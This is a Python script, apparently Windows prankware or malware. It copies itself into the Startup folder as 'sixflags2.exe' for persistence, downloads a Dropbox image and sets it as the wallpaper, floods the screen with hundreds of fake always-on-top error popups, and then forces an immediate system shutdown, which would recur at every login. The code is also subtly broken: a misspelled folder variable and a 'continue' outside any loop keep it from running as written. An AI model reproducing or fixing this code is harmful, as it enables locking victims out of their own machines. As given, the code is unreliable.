import ctypes
import os
import shutil
from pathlib import Path
import requests
import tkinter as tk
import random
import time

root = tk.Tk()
root.withdraw()

current_file_path = os.path.abspath(__file__)
statrup_folder = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
startup_file_path = os.path.join(startup_folder, "sixflags2.exe")
if not os.path.exists(startup_file_path):
    shutil.copy2(current_file_path, startup_file_path)
else:
    continue    
screen_width = root.winfo_screenwidth()
screen_height = root.winfo_screenheight()

url = "https://www.dropbox.com/scl/fi/yqv9uxkovv53bemxssav9/bruh.jpg?rlkey=2u7ldyutirqq1z2j7x3fxh2oj&st=0dy4w0sr&dl=1"
folder = r"C:\Users\Public"
image_path = os.path.join(folder, "bruh.png")

def download_wallpaper():
    try:
        response = requests.get(url, timeout=10)
        with open(image_path, 'wb') as f:
            f.write(response.content)
        return True
    except Exception as e:
        print("Wallpaper download failed:", e)
        return False

def set_desktop_background(image_path):
    SPI_SETDESKWALLPAPER = 20
    result = ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, image_path, 3)
    if not result:
        print("Failed to set wallpaper")

def make_native_style_popup(kind):
    width, height = 300, 120
    x = random.randint(0, screen_width - width)
    y = random.randint(0, screen_height - height)
    
    win = tk.Toplevel()
    win.geometry(f"{width}x{height}+{x}+{y}")
    win.title(kind)
    win.attributes("-toolwindow", True)
    win.attributes("-topmost", True)  # Always on top
    
    icon_label = tk.Label(win, font=("Segoe UI Symbol", 40))
    if kind == "Error":
        icon_label.config(text="❌", fg="red")
    else:
        icon_label.config(text="⚠️", fg="orange")
    icon_label.pack(side="left", padx=10, pady=10)

    text_label = tk.Label(win, text="har har", font=("Segoe UI", 14))
    text_label.pack(side="left", padx=10)

def schedule_popups():
    kinds = ["Error", "Warning", "Error", "Warning"]
    delay = 0
    for i in range(100):
        for kind in kinds:
            root.after(delay, lambda k=kind: make_native_style_popup(k))
            delay += 5  # super fast spawn

def shutdown():
    root.destroy()
    time.sleep(1)
    os.system("shutdown /s /t 1")

def main():
    if download_wallpaper():
        set_desktop_background(image_path)
    else:
        print("Skipping wallpaper change due to download failure.")
    
    schedule_popups()
    root.after(5200, shutdown)

root.after(0, main)
root.mainloop()
